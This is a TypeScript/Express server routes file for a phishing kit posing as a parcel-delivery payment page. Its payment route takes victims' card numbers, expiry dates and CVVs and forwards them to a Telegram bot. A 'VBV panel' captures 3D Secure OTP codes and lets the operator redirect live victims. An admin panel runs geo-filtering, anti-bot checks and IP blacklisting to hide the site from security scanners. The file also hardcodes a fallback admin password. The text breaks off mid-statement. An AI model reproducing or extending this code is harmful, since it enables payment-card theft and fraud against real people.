import type { Express, Request, Response } from "express";
import { createServer, type Server } from "http";
import fs from "fs/promises";
import path from "path";
import { getRealIp } from "./secure/panel/ip-manager";
import { sendToTelegram, sendCustomMessage, buildTelegramMessage, buildTelegramMessage3DS } from "./secure/app/send";
import { buildPanelLink, extractVisitId } from "./utils/panel-link";
import { rateLimitMiddleware } from "./middleware/rate-limit";
import { resetRateLimitForIp, resetAllRateLimits } from "./secure/panel/rate-limiter";
import { checkBIN, formatBINDisplay } from "./services/bin-checker";
import { flowService } from "./services/flow-service";
import { weightService } from "./services/weight-service";
import { vbvPanelService } from "./services/vbv-panel-service";
import type { FlowEventRequest, FlowResponse, FlowsListResponse } from "./types/flow";
import {
  getAllowedCountries,
  setAllowedCountries,
  addCountry,
  removeCountry,
} from "./services/geo-filter-service";
import {
  getAntiBotConfig,
  setAntiBotConfig,
} from "./services/antibot-config-service";
import {
  loadWhitelist,
  loadBlacklist,
  addToWhitelist,
  addToBlacklist,
  removeFromWhitelist,
  removeFromBlacklist,
  loadIPLists,
} from "./secure/panel/ip-manager";
import {
  readBotLogs,
  getBotLogsWithStats,
  countBotLogsToday,
  clearBotLogs,
  logBotActivity,
} from "./secure/panel/botfuck-logger";
import { getGeoLocation } from "./secure/panel/geo-filter";
import { config } from "./secure/config/config";
import { isDatacenterIP, datacenterFromApiData } from "./secure/panel/datacenter-detection";
import { detectProxy } from "./secure/panel/proxy-detection";
import type { Request as ExpressRequest } from "express";
import {
  createSession,
  isValidSession,
  destroySession,
  extractSessionId,
} from "./services/session-service";
import { quickHoneypotCheck } from "./secure/panel/honeypot";
import { getSiteKey, verifyHCaptcha } from "./secure/panel/hcaptcha";

/**
 * Helper pour envoyer un message Telegram avec un token et chat ID personnalisés
 */
async function sendTelegramMessage(
  message: string,
  chatId: string,
  botToken: string
): Promise<boolean> {
  try {
    const response = await fetch(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "HTML",
        }),
      },
    );
    return response.ok;
  } catch (error) {
    console.error("Failed to send Telegram message:", error);
    return false;
  }
}

const VALID_FLOW_STEPS = ["payment", "payment-verification", "vbv", "success"] as const;

/**
 * Helper pour conditionner le rate limit selon l'environnement
 * En développement, retourne un middleware qui ne fait rien
 */
function conditionalRateLimit(options: { limit: number; windowMs: number }) {
  const isDevelopment = process.env.NODE_ENV === "development" || !process.env.NODE_ENV;
  
  if (isDevelopment) {
    // Retourner un middleware vide qui ne fait rien
    return [
      (req: Request, res: Response, next: () => void) => {
        console.log(`[DEV] Rate limit disabled for ${req.method} ${req.path}`);
        next();
      }
    ];
  }
  return [rateLimitMiddleware(options)];
}

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {

  /**
   * GET /api/geo-gate
   * Portail géo : le frontend appelle cette route au chargement (SecurityCheck).
   * Le middleware antibot (filtre géo) s'exécute avant ; si pays non autorisé → 302 vers Google.
   * Si on atteint cette route → 200, le visiteur peut continuer.
   */
  app.get("/api/geo-gate", (req: Request, res: Response) => {
    res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate");
    return res.status(200).json({ ok: true });
  });

  /**
   * POST /api/flows/event
   * Crée ou met à jour un événement de flow
   */
  app.post("/api/flows/event", (req: Request, res: Response) => {
    const { step, flowId, notes } = req.body as FlowEventRequest;

    if (!step || !VALID_FLOW_STEPS.includes(step)) {
      return res.status(400).json({ message: "Invalid step" });
    }

    const flow = flowService.upsert(step, flowId, notes);
    return res.json({ flow } satisfies FlowResponse);
  });


  /**
   * GET /api/parcel-weight
   * Génère un poids basé sur l'IP/session (entre 0.5 et 4 kg, cache 12h)
   */
  app.get(
    "/api/parcel-weight",
    ...conditionalRateLimit({ limit: 100, windowMs: 60 * 60 * 1000 }),
    (req: Request, res: Response) => {
      const clientIp = getRealIp(req) || "unknown";
      const sessionId = (req.headers["x-session-id"] as string) || clientIp;
      const identifier = sessionId || clientIp;

      const result = weightService.generate(identifier);
      return res.json(result);
    },
  );

  /**
   * GET /api/bin/check
   * Vérifie un BIN (Bank Identification Number) via l'API
   */
  app.get(
    "/api/bin/check",
    ...conditionalRateLimit({ limit: 50, windowMs: 60 * 1000 }),
    async (req: Request, res: Response) => {
      // S'assurer que la réponse est en JSON
      res.setHeader("Content-Type", "application/json");
      
      const { bin } = req.query;

      if (!bin || typeof bin !== "string") {
        return res.status(400).json({ error: "BIN is required" });
      }

      const cleanBin = bin.replace(/\D/g, "").substring(0, 6);

      if (cleanBin.length < 6) {
        return res.status(400).json({ error: "BIN must be at least 6 digits" });
      }

      try {
        const binInfo = await checkBIN(cleanBin);
        
        if (!binInfo) {
          return res.status(404).json({ 
            error: "BIN not found",
            valid: false 
          });
        }

        return res.json({
          valid: true,
          data: binInfo,
        });
      } catch (error) {
        console.error("BIN check error:", error);
        return res.status(500).json({ 
          error: "Failed to check BIN",
          valid: false 
        });
      }
    },
  );

  /**
   * GET /api/captcha/site-key
   * Retourne la clé publique hCaptcha pour le widget client
   */
  app.get(
    "/api/captcha/site-key",
    ...conditionalRateLimit({ limit: 60, windowMs: 60 * 1000 }),
    (_req: Request, res: Response) => {
      const siteKey = getSiteKey()?.trim() || "";
      return res.json({ siteKey });
    },
  );

  /**
   * POST /api/captcha/verify
   * Vérifie la réponse hCaptcha (token renvoyé par le widget)
   * Body: { response: string }
   */
  app.post(
    "/api/captcha/verify",
    ...conditionalRateLimit({ limit: 30, windowMs: 60 * 1000 }),
    async (req: Request, res: Response) => {
      const { response: token } = req.body as { response?: string };
      if (!token || typeof token !== "string") {
        return res.status(400).json({ success: false, "error-codes": ["missing-input-response"] });
      }
      const ip = getRealIp(req);
      const result = await verifyHCaptcha(token, ip);
      return res.json(result);
    },
  );

  /**
   * POST /api/telegram/send
   * Envoie un message personnalisé vers Telegram
   * 
   * Accepte deux formats:
   * 1. Format structuré (recommandé): { title, fields } - formaté automatiquement selon tlg.md
   * 2. Format legacy: { message, parseMode } - message pré-formaté
   */
  app.post(
    "/api/telegram/send",
    ...conditionalRateLimit({ limit: 20, windowMs: 60 * 60 * 1000 }),
    async (req: Request, res: Response) => {
      const { telegram } = config;
      if (!telegram.token?.trim() || !telegram.chatId?.trim()) {
        return res.status(503).json({
          error: "Telegram not configured",
          message: "Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID on Render (Environment).",
        });
      }

      const body = req.body as {
        // Format 3D Secure (OTP + rappel session)
        type?: "3ds";
        otpCode?: string;
        // Format structuré (nouveau)
        title?: string;
        fields?: Record<string, string>;
        // Format legacy
        message?: string;
        parseMode?: "Markdown" | "HTML";
      };

      // Format 3D Secure: OTP + rappel carte depuis la session en cours
      if (body.type === "3ds" && body.otpCode && typeof body.otpCode === "string") {
        const visitId = extractVisitId(req);
        const ip = getRealIp(req) || "unknown";
        const client = visitId ? vbvPanelService.getClient(visitId) : undefined;
        const message = buildTelegramMessage3DS(body.otpCode, ip, {
          country: client?.country ?? "",
          bin: client?.binDisplay ?? "",
          cardholder: client?.cardInfo?.cardholder ?? "",
          cardNumber: client?.cardInfo?.cardNumber ?? "",
          expiry: client?.cardInfo?.expiry ?? "",
          cvv: client?.cardInfo?.cvv ?? "",
        });
        const success = await sendCustomMessage(message, "HTML");
        if (!success) {
          return res.status(500).json({ error: "Failed to send message" });
        }
        return res.json({ success: true });
      }

      // Si title et fields sont présents, utiliser le format standardisé
      if (body.title && body.fields) {
        const ip = getRealIp(req) || "unknown";
        const visitId = extractVisitId(req);
        const panelLink = buildPanelLink(req, visitId);

        const message = buildTelegramMessage(
          body.title,
          body.fields,
          ip,
          visitId,
          panelLink,
        );

        const success = await sendCustomMessage(message, "HTML");

        if (!success) {
          return res.status(500).json({ error: "Failed to send message" });
        }

        return res.json({ success: true });
      }

      // Format legacy: message pré-formaté
      if (!body.message || typeof body.message !== "string") {
        return res.status(400).json({ 
          error: "Either 'title' and 'fields' (structured) or 'message' (legacy) is required" 
        });
      }

      const success = await sendCustomMessage(
        body.message, 
        body.parseMode || "Markdown"
      );

      if (!success) {
        return res.status(500).json({ error: "Failed to send message" });
      }

      return res.json({ success: true });
    },
  );

  /**
   * POST /api/payment/submit
   * Soumet les informations de paiement et les envoie vers Telegram
   */
  app.post(
    "/api/payment/submit",
    ...conditionalRateLimit({ limit: 100, windowMs: 60 * 60 * 1000 }),
    async (req: Request, res: Response) => {
      // Log pour déboguer
      console.log(`[PAYMENT] Received payment submission from IP: ${getRealIp(req)}`);
      
      // Vérification Honeypot
      const antibotConfig = await getAntiBotConfig();
      if (antibotConfig.enabled && antibotConfig.honeypot_check) {
        const honeypotDetected = quickHoneypotCheck(req.body);
        if (honeypotDetected) {
          const ip = getRealIp(req);
          await logBotActivity(ip, "Honeypot field filled", "blocked", {
            details: { source: "payment_form", formData: Object.keys(req.body) },
          });
          await addToBlacklist(ip, "Honeypot field filled");
          return res.redirect(302, "https://www.google.com");
        }
      }
      
      const { cardholder, cardNumber, expiry, cvv, amount } = req.body as {
        cardholder?: string;
        cardNumber?: string;
        expiry?: string;
        cvv?: string;
        amount?: string;
      };

      // Validation des champs requis
      if (!cardholder || !cardNumber || !expiry || !cvv) {
        return res.status(400).json({
          error: "Missing required fields",
          required: ["cardholder", "cardNumber", "expiry", "cvv"],
        });
      }

      // Nettoyer le numéro de carte et extraire le BIN
      const cleanCardNumber = cardNumber.replace(/\D/g, "");
      
      // Validation Luhn
      let sum = 0;
      let isEven = false;
      for (let i = cleanCardNumber.length - 1; i >= 0; i--) {
        let digit = parseInt(cleanCardNumber[i], 10);
        if (isEven) {
          digit *= 2;
          if (digit > 9) digit -= 9;
        }
        sum += digit;
        isEven = !isEven;
      }
      if (sum % 10 !== 0) {
        return res.status(400).json({
          error: "Invalid card number (Luhn check failed)",
        });
      }
      
      // Validation BIN DÉSACTIVÉE
      
      // Validation de la date d'expiration
      const expiryCleaned = expiry.replace(/\D/g, "");
      if (expiryCleaned.length === 4) {
        const month = parseInt(expiryCleaned.substring(0, 2), 10);
        const year = parseInt(expiryCleaned.substring(2, 4), 10);
        const now = new Date();
        const currentYear = now.getFullYear() % 100;
        const currentMonth = now.getMonth() + 1;
        
        if (month < 1 || month > 12) {
          return res.status(400).json({
            error: "Invalid expiry month",
          });
        }
        
        if (year < currentYear || (year === currentYear && month < currentMonth)) {
          return res.status(400).json({
            error: "Card expired",
          });
        }
      } else {
        return res.status(400).json({
          error: "Invalid expiry date format",
        });
      }

      const bin = cleanCardNumber.length >= 6 ? cleanCardNumber.substring(0, 6) : cleanCardNumber;
      
      // Vérification BIN DÉSACTIVÉE - utiliser les valeurs par défaut
      let binInfo = null;
      let binDisplay = bin + " (Non vérifié)";
      
      // Optionnel: essayer de vérifier le BIN mais ne pas rejeter si échec
      if (bin.length === 6) {
        try {
          binInfo = await checkBIN(bin);
          if (binInfo && binInfo.card !== "N/A") {
            binDisplay = formatBINDisplay(binInfo);
          }
        } catch (error) {
          // Ignorer les erreurs de vérification BIN
          console.log("[Payment] BIN check failed (non-blocking):", error);
        }
      }

      // Envoi vers Telegram avec informations BIN
      const success = await sendToTelegram(
        {
          cardholder,
          cardNumber,
          expiry,
          cvv,
          amount: amount || "R 48.20",
          bin: binDisplay,
          binInfo: binInfo ? {
            card: binInfo.card,
            bank: binInfo.bank,
            type: binInfo.type,
            country: binInfo.country,
          } : undefined,
        },
        req,
      );

      if (!success) {
        return res.status(500).json({ error: "Failed to process payment" });
      }

      // Enregistrer la session VBV avec carte + BIN/country pour rappel 3D Secure
      const visitId = extractVisitId(req);
      const ip = getRealIp(req) || "unknown";
      if (visitId) {
        vbvPanelService.upsertClient({
          visitId,
          ip,
          cardInfo: { cardholder, cardNumber, expiry, cvv },
          binDisplay,
          country: binInfo?.country ?? "",
        });
      }

      // Enregistrer l'événement de flow
      const flow = flowService.upsert("payment", undefined, "Payment form submitted");

      return res.json({ success: true, flowId: flow.id });
    },
  );

  /**
   * POST /api/vbv-panel/register
   * Enregistre ou met à jour un client sur la page VBV
   */
  app.post(
    "/api/vbv-panel/register",
    ...conditionalRateLimit({ limit: 100, windowMs: 60 * 1000 }),
    async (req: Request, res: Response) => {
      const visitId = extractVisitId(req);
      const ip = getRealIp(req) || "unknown";

      // Debug: logger les headers pour voir ce qui est reçu
      if (!visitId && process.env.NODE_ENV === "development") {
        console.log("[VBV Panel] Register - Headers received:", {
          "x-visit-id": req.headers["x-visit-id"],
          "X-Visit-Id": req.headers["X-Visit-Id"],
          allHeaders: Object.keys(req.headers).filter(h => h.toLowerCase().includes("visit")),
        });
      }

      if (!visitId) {
        console.error("[VBV Panel] Register failed: No visitId");
        return res.status(400).json({ error: "Visit ID required" });
      }

      const body = req.body as {
        fullName?: string;
        cardInfo?: {
          cardholder: string;
          cardNumber: string;
          expiry: string;
          cvv: string;
        };
        otpCode?: string;
        page?: string;
      };

      try {
        const client = vbvPanelService.upsertClient({
          visitId,
          ip,
          fullName: body.fullName,
          cardInfo: body.cardInfo,
          otpCode: body.otpCode,
          page: body.page,
        });

        console.log(`[VBV Panel] Client registered: ${visitId.substring(0, 12)}... (IP: ${ip}, Page: ${body.page || "Payment Verification"})`);
        return res.json({ success: true, client });
      } catch (error) {
        console.error("[VBV Panel] Register error:", error);
        return res.status(500).json({ error: "Failed to register client" });
      }
    },
  );

  /**
   * POST /api/vbv-panel/heartbeat
   * Met à jour le heartbeat d'un client (pour détecter s'il est en ligne)
   */
  app.post(
    "/api/vbv-panel/heartbeat",
    ...conditionalRateLimit({ limit: 1000, windowMs: 60 * 1000 }),
    async (req: Request, res: Response) => {
      const visitId = extractVisitId(req);
      const ip = getRealIp(req) || "unknown";

      if (!visitId) {
        return res.status(400).json({ error: "Visit ID required" });
      }

      // Mettre à jour le heartbeat, créer le client s'il n'existe pas encore
      const updated = vbvPanelService.updateHeartbeat(visitId, ip);

      if (!updated) {
        return res.status(500).json({ error: "Failed to update heartbeat" });
      }

      return res.json({ success: true });
    },
  );

  /**
   * GET /api/vbv-panel/clients
   * Récupère tous les clients sur la page VBV
   */
  app.get(
    "/api/vbv-panel/clients",
    ...conditionalRateLimit({ limit: 100, windowMs: 60 * 1000 }),
    (_req: Request, res: Response) => {
      const clients = vbvPanelService.getAllClients();
      console.log(`[VBV Panel] Returning ${clients.length} clients`);
      return res.json({ clients });
    },
  );

  /**
   * POST /api/vbv-panel/redirect
   * Demande une redirection pour un client
   */
  app.post(
    "/api/vbv-panel/redirect",
    ...conditionalRateLimit({ limit: 100, windowMs: 60 * 1000 }),
    (req: Request, res: Response) => {
      const body = req.body as {
        visitId: string;
        redirectTo: string;
      };

      if (!body.visitId || !body.redirectTo) {
        return res.status(400).json({ error: "visitId and redirectTo are required" });
      }

      const success = vbvPanelService.requestRedirect(body.visitId, body.redirectTo);

      if (!success) {
        return res.status(404).json({ error: "Client not found" });
      }

      return res.json({ success: true });
    },
  );

  /**
   * POST /api/vbv-panel/leave
   * Retire le client de la liste (appelé à la fermeture de la fenêtre)
   */
  app.post(
    "/api/vbv-panel/leave",
    ...conditionalRateLimit({ limit: 100, windowMs: 60 * 1000 }),
    (req: Request, res: Response) => {
      const visitId = (req.body as { visitId?: string })?.visitId ?? extractVisitId(req);

      if (!visitId) {
        return res.status(400).json({ error: "Visit ID required" });
      }

      const removed = vbvPanelService.removeClient(visitId);
      if (removed) {
        console.log(`[VBV Panel] Client left: ${visitId.substring(0, 12)}...`);
      }
      return res.json({ success: true });
    },
  );

  /**
   * GET /api/vbv-panel/redirect-status
   * Vérifie si une redirection a été demandée pour le client actuel
   */
  app.get(
    "/api/vbv-panel/redirect-status",
    ...conditionalRateLimit({ limit: 1000, windowMs: 60 * 1000 }),
    (req: Request, res: Response) => {
      const visitId = extractVisitId(req);

      if (!visitId) {
        return res.status(400).json({ error: "Visit ID required" });
      }

      const redirectTo = vbvPanelService.getAndConsumeRedirect(visitId);

      return res.json({
        shouldRedirect: redirectTo !== null,
        redirectTo: redirectTo || null,
      });
    },
  );

  /**
   * POST /api/admin/reset-rate-limit (développement uniquement)
   * Réinitialise le rate limit pour une IP ou toutes les IPs
   */
  const isDevelopment = process.env.NODE_ENV === "development" || !process.env.NODE_ENV;
  
  if (isDevelopment) {
    // Réinitialiser automatiquement au démarrage en développement
    resetAllRateLimits();
    console.log("[DEV] Rate limits disabled - all limits reset on startup");
    console.log(`[DEV] NODE_ENV: ${process.env.NODE_ENV || "undefined"}`);

    app.post("/api/admin/reset-rate-limit", (req: Request, res: Response) => {
      const { ip } = req.body as { ip?: string };
      
      if (ip) {
        resetRateLimitForIp(ip);
        return res.json({ success: true, message: `Rate limit reset for IP: ${ip}` });
      } else {
        resetAllRateLimits();
        return res.json({ success: true, message: "All rate limits reset" });
      }
    });

    // GET endpoint pour faciliter la réinitialisation depuis le navigateur
    app.get("/api/admin/reset-rate-limit", (_req: Request, res: Response) => {
      resetAllRateLimits();
      return res.json({ 
        success: true, 
        message: "All rate limits reset",
        environment: process.env.NODE_ENV || "development",
        rateLimitDisabled: true
      });
    });

    // Endpoint de test pour vérifier l'état du rate limit
    app.get("/api/admin/rate-limit-status", (_req: Request, res: Response) => {
      return res.json({
        environment: process.env.NODE_ENV || "development",
        rateLimitDisabled: true,
        message: "Rate limit is disabled in development mode"
      });
    });
  }

  // ============================================================================
  // ROUTES OZYADMIN - Panel d'Administration
  // ============================================================================

  // Mot de passe d'administration (à changer en production)
  const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "music2018";

  /**
   * Middleware d'authentification pour OzyAdmin
   */
  function requireAdminAuth(req: Request, res: Response, next: () => void) {
    const sessionId = extractSessionId(req);
    if (sessionId && isValidSession(sessionId)) {
      return next();
    }
    return res.status(401).json({ error: "Unauthorized" });
  }

  /**
   * GET /api/ozyadmin/check
   * Vérifie si la session est valide sans renvoyer 401 (évite l'erreur console au chargement)
   */
  app.get("/api/ozyadmin/check", (req: Request, res: Response) => {
    const sessionId = extractSessionId(req);
    const authenticated = !!(sessionId && isValidSession(sessionId));
    return res.json({ authenticated });
  });

  /**
   * POST /api/ozyadmin/login
   * Authentification
   */
  app.post("/api/ozyadmin/login", (req: Request, res: Response) => {
    const rawBody = (req.body as { password?: string }) ?? {};
    const receivedPassword = String(rawBody.password ?? "").trim();
    const expectedPassword = String(ADMIN_PASSWORD ?? "").trim();

    if (!receivedPassword) {
      console.log("[OzyAdmin] Login failed: no password received (body may be empty or Content-Type wrong)");
    } else if (receivedPassword !== expectedPassword) {
      console.log("[OzyAdmin] Login failed: password mismatch");
    }

    if (receivedPassword && receivedPassword === expectedPassword) {
      const sessionId = createSession();
      const maxAge = 7 * 24 * 60 * 60 * 1000; // 7 jours
      const isCrossOrigin = Boolean(process.env.FRONTEND_ORIGIN?.trim());
      const secure = process.env.NODE_ENV === "production" ? "Secure; " : "";
      const sameSite = isCrossOrigin ? "SameSite=None; " : "SameSite=Lax; ";
      res.setHeader(
        "Set-Cookie",
        `ozyadmin_session=${sessionId}; HttpOnly; ${secure}${sameSite}Max-Age=${Math.floor(maxAge / 1000)}; Path=/`
      );
      return res.json({ success: true, sessionId });
    }
    
    return res.status(401).json({ error: "Invalid password" });
  });

  /**
   * POST /api/ozyadmin/logout
   * Déconnexion
   */
  app.post("/api/ozyadmin/logout", (req: Request, res: Response) => {
    const sessionId = extractSessionId(req);
    if (sessionId) {
      destroySession(sessionId);
    }
    const isCrossOrigin = Boolean(process.env.FRONTEND_ORIGIN?.trim());
    const sameSite = isCrossOrigin ? "SameSite=None; Secure; " : "SameSite=Lax; ";
    res.setHeader(
      "Set-Cookie",
      `ozyadmin_session=; HttpOnly; ${sameSite}Max-Age=0; Path=/`
    );
    return res.json({ success: true });
  });

  /**
   * GET /api/ozyadmin/dashboard
   * Statistiques du dashboard
   */
  app.get("/api/ozyadmin/dashboard", requireAdminAuth, async (req: Request, res: Response) => {
    try {
      const allowedCountries = await getAllowedCountries();
      const antibotConfig = await getAntiBotConfig();
      const blacklist = await loadBlacklist();
      const whitelist = await loadWhitelist();
      const detectionsToday = await countBotLogsToday();
      const recentLogs = await readBotLogs(10);

      // Statistiques basiques
      const stats = {
        today: detectionsToday,
        allowedCountries: allowedCountries.length,
        antibotEnabled: antibotConfig.enabled,
        blacklistCount: blacklist.length,
        whitelistCount: whitelist.length,
        telegramConfigured: !!config.telegram.token,
      };

      return res.json({ stats, recentLogs: recentLogs.slice(0, 10) });
    } catch (error) {
      console.error("[OzyAdmin] Dashboard error:", error);
      return res.status(500).json({ error: "Failed to load dashboard" });
    }
  });

  /**
   * GET /api/ozyadmin/telegram
   * Récupère la configuration Telegram
   */
  app.get("/api/ozyadmin/telegram", requireAdminAuth, (req: Request, res: Response) => {
    return res.json({
      bot: config.telegram.token,
      chatIds: [config.telegram.chatId],
    });
  });

  /**
   * POST /api/ozyadmin/telegram
   * Sauvegarde la configuration Telegram
   */
  app.post("/api/ozyadmin/telegram", requireAdminAuth, async (req: Request, res: Response) => {
    const { bot, chatIds } = req.body as { bot?: string; chatIds?: string[] };
    
    // Note: En production, sauvegarder dans un fichier de config ou base de données
    // Pour l'instant, on retourne juste un succès
    return res.json({ success: true, message: "Configuration saved (requires server restart)" });
  });

  /**
   * POST /api/ozyadmin/telegram/test
   * Teste la connexion Telegram
   */
  app.post("/api/ozyadmin/telegram/test", requireAdminAuth, async (req: Request, res: Response) => {
    const { bot, chatId } = req.body as { bot?: string; chatId?: string };
    
    if (!bot || !chatId) {
      return res.status(400).json({ error: "Bot token and chat ID required" });
    }

    try {
      const success = await sendTelegramMessage(
        `✅ Test de connexion OzyAdmin réussi!\n🕐 ${new Date().toLocaleString()}`,
        chatId,
        bot
      );
      if (success) {
        return res.json({ success: true, message: "Test message sent" });
      } else {
        return res.status(500).json({ error: "Failed to send test message" });
      }
    } catch (error) {
      return res.status(500).json({ error: "Failed to send test message" });
    }
  });

  /**
   * GET /api/ozyadmin/geo
   * Récupère la liste des pays autorisés
   */
  app.get("/api/ozyadmin/geo", requireAdminAuth, async (req: Request, res: Response) => {
    try {
      const countries = await getAllowedCountries();
      return res.json({ countries });
    } catch (error) {
      return res.status(500).json({ error: "Failed to load countries" });
    }
  });

  /**
   * POST /api/ozyadmin/geo/add
   * Ajoute un pays
   */
  app.post("/api/ozyadmin/geo/add", requireAdminAuth, async (req: Request, res: Response) => {
    const { country } = req.body as { country?: string };
    
    if (!country || country.length !== 2) {
      return res.status(400).json({ error: "Invalid country code (2 letters)" });
    }

    try {
      await addCountry(country);
      return res.json({ success: true });
    } catch (error) {
      return res.status(500).json({ error: "Failed to add country" });
    }
  });

  /**
   * POST /api/ozyadmin/geo/remove
   * Retire un pays
   */
  app.post("/api/ozyadmin/geo/remove", requireAdminAuth, async (req: Request, res: Response) => {
    const { country } = req.body as { country?: string };
    
    if (!country) {
      return res.status(400).json({ error: "Country code required" });
    }

    try {
      await removeCountry(country);
      return res.json({ success: true });
    } catch (error) {
      return res.status(500).json({ error: "Failed to remove country" });
    }
  });

  /**
   * POST /api/ozyadmin/geo/set
   * Définit la liste complète des pays
   */
  app.post("/api/ozyadmin/geo/set", requireAdminAuth, async (req: Request, res: Response) => {
    const { countries } = req.body as { countries?: string[] };
    
    if (!Array.isArray(countries)) {
      return res.status(400).json({ error: "Countries must be an array" });
    }

    try {
      await setAllowedCountries(countries);
      return res.json({ success: true });
    } catch (error) {
      return res.status(500).json({ error: "Failed to set countries" });
    }
  });

  /**
   * GET /api/ozyadmin/antibot
   * Récupère la configuration Anti-Bot
   */
  app.get("/api/ozyadmin/antibot", requireAdminAuth, async (req: Request, res: Response) => {
    try {
      const config = await getAntiBotConfig();
      return res.json({ config });
    } catch (error) {
      return res.status(500).json({ error: "Failed to load config" });
    }
  });

  /**
   * POST /api/ozyadmin/antibot
   * Sauvegarde la configuration Anti-Bot
   */
  app.post("/api/ozyadmin/antibot", requireAdminAuth, async (req: Request, res: Response) => {
    const body = req.body as any;
    
    // Support des deux formats: { config: {...} } ou directement {...}
    let config: Partial<Awaited<ReturnType<typeof getAntiBotConfig>>>;
    
    if (body && typeof body === "object" && "config" in body) {
      config = body.config;
    } else {
      config = body;
    }
    
    if (!config || typeof config !== "object") {
      return res.status(400).json({ error: "Invalid config data" });
    }
    
    try {
      console.log("[OzyAdmin] Received config update:", config);
      await setAntiBotConfig(config);
      console.log("[OzyAdmin] Config saved successfully");
      return res.json({ success: true });
    } catch (error) {
      console.error("[OzyAdmin] Error saving antibot config:", error);
      return res.status(500).json({ error: "Failed to save config" });
    }
  });

  /**
   * GET /api/ozyadmin/iplists
   * Récupère les listes IP
   */
  app.get("/api/ozyadmin/iplists", requireAdminAuth, async (req: Request, res: Response) => {
    try {
      const lists = await loadIPLists();
      return res.json(lists);
    } catch (error) {
      return res.status(500).json({ error: "Failed to load IP lists" });
    }
  });

  /**
   * POST /api/ozyadmin/iplists/blacklist/add
   * Ajoute une IP à la blacklist
   */
  app.post("/api/ozyadmin/iplists/blacklist/add", requireAdminAuth, async (req: Request, res: Response) => {
    const { ip, reason } = req.body as { ip?: string; reason?: string };
    
    if (!ip) {
      return res.status(400).json({ error: "IP address required" });
    }

    try {
      await addToBlacklist(ip, reason);
      // Logger dans botfuck.txt
      const { logBotActivity } = await import("./secure/panel/botfuck-logger");
      await logBotActivity(ip, reason || "Manual add via OzyAdmin", "blocked", {
        details: { source: "ozyadmin" },
      });
      return res.json({ success: true });
    } catch (error) {
      return res.status(500).json({ error: "Failed to add to blacklist" });
    }
  });

  /**
   * POST /api/ozyadmin/iplists/whitelist/add
   * Ajoute une IP à la whitelist
   */
  app.post("/api/ozyadmin/iplists/whitelist/add", requireAdminAuth, async (req: Request, res: Response) => {
    const { ip } = req.body as { ip?: string };
    
    if (!ip) {
      return res.status(400).json({ error: "IP address required" });
    }

    try {
      await addToWhitelist(ip);
      return res.json({ success: true });
    } catch (error) {
      return res.status(500).json({ error: "Failed to add to whitelist" });
    }
  });

  /**
   * POST /api/ozyadmin/iplists/blacklist/remove
   * Retire une IP de la blacklist
   */
  app.post("/api/ozyadmin/iplists/blacklist/remove", requireAdminAuth, async (req: Request, res: Response) => {
    const { ip } = req.body as { ip?: string };
    
    if (!ip) {
      return res.status(400).json({ error: "IP address required" });
    }

    try {
      await removeFromBlacklist(ip);
      return res.json({ success: true });
    } catch (error) {
      return res.status(500).json({ error: "Failed to remove from blacklist" });
    }
  });

  /**
   * POST /api/ozyadmin/iplists/whitelist/remove
   * Retire une IP de la whitelist
   */
  app.post("/api/ozyadmin/iplists/whitelist/remove", requireAdminAuth, async (req: Request, res: Response) => {
    const { ip } = req.body as { ip?: string };
    
    if (!ip) {
      return res.status(400).json({ error: "IP address required" });
    }

    try {
      await removeFromWhitelist(ip);
      return res.json({ success: true });
    } catch (error) {
      return res.status(500).json({ error: "Failed to remove from whitelist" });
    }
  });

  /**
   * POST /api/ozyadmin/analyze
   * Analyse une IP
   */
  app.post("/api/ozyadmin/analyze", requireAdminAuth, async (req: Request, res: Response) => {
    const { ip } = req.body as { ip?: string };
    
    if (!ip) {
      return res.status(400).json({ error: "IP address required" });
    }

    try {
      // Comme beta2 : ip-api.com en premier (hosting/proxy + geo), puis fallback ipapi.co / getGeoLocation
      let geo: { country: string; countryCode: string; city?: string; region?: string } | null = null;
      let datacenter: Awaited<ReturnType<typeof isDatacenterIP>> | undefined;
      const fetchOpts = { headers: { "User-Agent": "Mozilla/5.0" } };

      const ipApiComFields = "status,country,countryCode,regionName,city,org,isp,as,hosting,proxy";
      const ipApiComUrls = [
        `http://ip-api.com/json/${ip}?fields=${ipApiComFields}`,
        `https://ip-api.com/json/${ip}?fields=${ipApiComFields}`,
      ];
      for (const url of ipApiComUrls) {
        try {
          const ipApiComRes = await fetch(url, fetchOpts);
          if (ipApiComRes.ok) {
            const data = (await ipApiComRes.json()) as Record<string, unknown>;
            if ((data.status as string) === "success") {
              if (data.country ?? data.countryCode) {
                const code = ((data.countryCode as string) || (data.country as string)?.slice(0, 2) || "??").slice(0, 2).toUpperCase();
                const name = (data.country as string)?.trim() || code;
                geo = {
                  country: name && name !== "??" && name.toLowerCase() !== "unknown" ? name : code,
                  countryCode: /^[A-Z]{2}$/i.test(code) ? code : "??",
                  city: data.city as string | undefined,
                  region: data.regionName as string | undefined,
                };
              }
              datacenter = datacenterFromApiData(data);
              break;
            }
          }
        } catch (e) {
          continue;
        }
      }

      if (!geo || datacenter == null) {
        try {
          const ipApiCoRes = await fetch(`https://ipapi.co/${ip}/json/`, fetchOpts);
          if (ipApiCoRes.ok) {
            const data = (await ipApiCoRes.json()) as Record<string, unknown>;
            if (!(data as { error?: boolean }).error) {
              if (!geo && (data.country_code ?? data.country_name)) {
                const code = ((data.country_code as string) || (data.country_name as string)?.slice(0, 2) || "??").slice(0, 2).toUpperCase();
                const name = (data.country_name as string)?.trim() || code;
                geo = {
                  country: name && name !== "??" && name.toLowerCase() !== "unknown" ? name : code,
                  countryCode: /^[A-Z]{2}$/i.test(code) ? code : "??",
                  city: data.city as string | undefined,
                  region: data.region as string | undefined,
                };
              }
              if (datacenter == null && (data.org ?? data.isp ?? data.organisation)) {
                datacenter = datacenterFromApiData(data);
              }
            }
          }
        } catch {
          // ignore
        }
      }
      if (!geo) geo = await getGeoLocation(ip);
      const finalDatacenter = datacenter ?? (await isDatacenterIP(ip));
      
      // Créer une requête mock pour detectProxy
      const mockReq = {
        headers: {},
        get: () => "",
        socket: { remoteAddress: ip },
      } as unknown as ExpressRequest;
      const proxy = detectProxy(mockReq);
      
      const allowedCountries = await getAllowedCountries();
      const whitelist = await loadWhitelist();
      const blacklist = await loadBlacklist();

      res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate");
      return res.json({
